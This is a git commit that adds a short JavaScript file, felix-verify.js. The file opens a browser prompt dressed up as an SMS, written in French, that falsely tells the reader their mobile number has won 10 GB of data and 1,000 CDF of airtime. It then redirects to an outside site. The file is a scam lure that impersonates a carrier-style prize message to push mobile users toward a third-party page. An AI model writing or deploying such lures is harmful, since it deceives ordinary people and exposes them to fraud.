5df0645a6d7bba7efd7c8e6af3cebc6fda273367
sweet16palz-hub <sweet16palz@gmail.com>
2026-05-06 16:03:14 +0100

    Create felix-verify.js

---
+++ felix-verify.js
@@ -0,0 +1,5 @@
+var password = '10GB + 1,000 CDF'
+password=prompt('SMS: Félicitations, votre numéro de mobile est éligible pour recevoir 10 Go + 1 000 unités de recharge CDF, cliquez sur OK pour activer','10GB + 1,000 CDF');
+if (password != '10GB + 1,000 CDF') {
+location.href='https://gbamz.com/felix-birthday';
+}
